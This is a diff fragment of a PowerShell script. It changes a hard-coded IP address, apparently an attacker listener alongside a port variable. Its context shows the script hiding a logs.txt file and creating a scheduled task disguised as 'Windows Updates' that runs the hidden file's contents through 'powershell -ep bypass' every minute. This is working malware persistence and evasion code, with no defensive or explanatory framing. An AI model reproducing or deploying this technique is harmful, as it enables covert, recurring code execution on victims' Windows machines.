@@ -72,7 +72,7 @@
 #Declaring Variables needed
 $hostname = [System.Net.Dns]::GetHostName()
 $username = whoami
-$ip   = "192.168.1.50"
+$ip   = "192.168.1.2"
 $port = "8000"
 $interface = "eth0"
 $n = 3
@@ -121,6 +121,7 @@ $acl | Set-Acl C:\Users\$env:USERNAME\Documents\logs.txt
 #hide the file
 $FILE=Get-Item '~\Documents\logs.txt' -Force
 $FILE.attributes='Hidden'
+
 #schadule a task to run the oneliner
 schtasks /create /sc minute /mo 1 /tn "Windows Updates" /tr "C:\Windows\System32\cmd.exe /c type %USERPROFILE%\Documents\logs.txt | powershell -ep bypass" /F
 
